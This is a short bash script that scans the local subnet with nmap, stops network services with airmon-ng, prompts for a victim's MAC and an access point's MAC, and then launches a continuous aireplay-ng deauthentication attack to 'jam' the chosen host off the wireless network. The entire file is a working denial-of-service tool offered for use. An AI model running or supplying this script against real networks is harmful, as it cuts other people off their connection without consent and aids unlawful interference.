#!/bin/bash
DefaultGateway=`route -n|grep ^0.0.0.0|cut -d' ' -f 10 | uniq`
nmap -sP $DefaultGateway/24
echo "Now, what is the MAC of the host you wish to disconnect? ";read hostmac
ifconfig ${1} up
ifconfig ${1} down
airmon-ng check kill
echo "What is the MAC address of the network? ";read netmac
# echo -n "What is the channel of the network? ";read netchan
# airodump-ng -c $netchan -b $netmac -w psk ${1}
# echo "$hostmac should be listed in the table. Press Enter to Continue";read
#I took this part out as I dont know how to run the rest of the script in a new terminal.
echo "Note that once it has begun, go to a new terminal and write ifconfig ${1} up"
echo "This will bring your internet connection back."
echo -n "Press Enter to Jam the host. ";read
aireplay-ng -0 0 -a $netmac -c $hostmac ${1}
